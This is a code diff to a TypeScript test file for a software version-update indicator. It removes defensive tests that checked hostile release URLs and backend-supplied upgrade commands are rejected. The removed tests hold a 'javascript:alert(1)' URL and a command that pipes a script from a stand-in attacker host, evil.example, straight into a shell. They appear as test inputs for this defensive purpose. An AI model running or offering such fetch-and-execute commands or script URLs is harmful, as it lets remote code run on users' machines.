@@ -7,7 +7,6 @@ import { versionCheckQueryKey, type VersionCheckTarget } from '@/hooks/use-versi
 import type { VersionCheckResult } from '@/types';
 
 import { VersionUpdateContent, VersionUpdateIndicator } from './VersionUpdateIndicator';
-import { CANONICAL_UPGRADE_COMMAND, safeReleaseURL, safeUpgradeCommand } from './version-update-safety';
 import { manualVersionCheckToast } from './version-update-toast';
 import {
   safeReleaseUrl,
@@ -101,35 +100,6 @@ describe('VersionUpdateIndicator', () => {
     expect(markup).not.toContain('China mirror');
     expect(markup).not.toContain('Global source');
     expect(markup).not.toContain('--source');
-  });
-
-  test('hostile release URLs fall back to GitHub releases', () => {
-    expect(safeReleaseURL('javascript:alert(1)')).toBe('https://github.com/zsio/netsgo/releases');
-    expect(safeReleaseURL('https://evil.example/zsio/netsgo/releases')).toBe('https://github.com/zsio/netsgo/releases');
-    expect(safeReleaseURL('https://github.com/zsio/netsgo/releases/tag/v0.2.0')).toBe('https://github.com/zsio/netsgo/releases/tag/v0.2.0');
-  });
-
-  test('unexpected backend upgrade commands are not trusted or copied', () => {
-    expect(safeUpgradeCommand(CANONICAL_UPGRADE_COMMAND)).toBe(CANONICAL_UPGRADE_COMMAND);
-    expect(safeUpgradeCommand('curl https://evil.example/install.sh | sh')).toBe('');
-    const target: VersionCheckTarget = {
-      kind: 'server',
-      version: 'v0.1.0',
-      installMethod: 'service',
-    };
-    const markup = renderToStaticMarkup(createElement(VersionUpdateContent, {
-      target,
-      data: result({
-        update_available: true,
-        recommended_action: 'run_script',
-        release_url: 'javascript:alert(1)',
-        commands: {
-          command: 'curl https://evil.example/install.sh | sh',
-        },
-      }),
-    }));
-    expect(markup).not.toContain('evil.example');
-    expect(markup).toContain('GitHub Releases');
   });
 
   test('binary update does not render script commands', () => {
